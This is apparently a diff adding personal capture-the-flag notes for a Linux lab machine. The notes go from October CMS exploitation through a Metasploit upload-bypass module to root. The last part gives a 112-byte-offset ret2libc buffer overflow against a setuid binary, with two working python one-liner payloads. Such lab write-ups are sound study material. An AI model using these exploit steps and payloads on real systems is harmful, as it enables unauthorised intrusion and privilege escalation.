@@ -1,0 +1,35 @@
+OS:
+- Linux
+
+Open Ports:
+- 22
+- 80
+
+- enumerating webserver
+- using service called october cms
+- searchsploit
+- ran msfconsole
+- exploit: multi/http/october_upload_bypass_exec
+- shell access
+- spawned tty through vi
+- got user flag
+- grabbed kernel version
+- checking for privilege escalation methods
+- checking sudo -l. requires password
+- looking for setuid files
+- /usr/local/bin/ovrflw
+- copied to local machine
+- using gdb to identify buffer offset
+- offset is 112
+- created python script to confirm control of EIP
+- ran executable in gdb to grab memory address of system + exit + /bin/sh
+- created overflow shellcode
+- testing with python2 
+# while true; do ./ovrflw $(python -c 'print "A"*112 + "\x10\x93\x5f\xb7\x10\x93\x5f\xb7\xac\xbb\x71\xb7"'); done
+- got root access
+
+- trying buffer overflow with python3
+- ran into issues with encoding
+- was able to get root access using:
+# ./ovrflw `python3 -c 'import sys;sys.stdout.buffer.write(b"A"*112 + b"\x10\x93\x5f\xb7\x10\x93\x5f\xb7\xac\xbb\x71\xb7")' `
+- root access
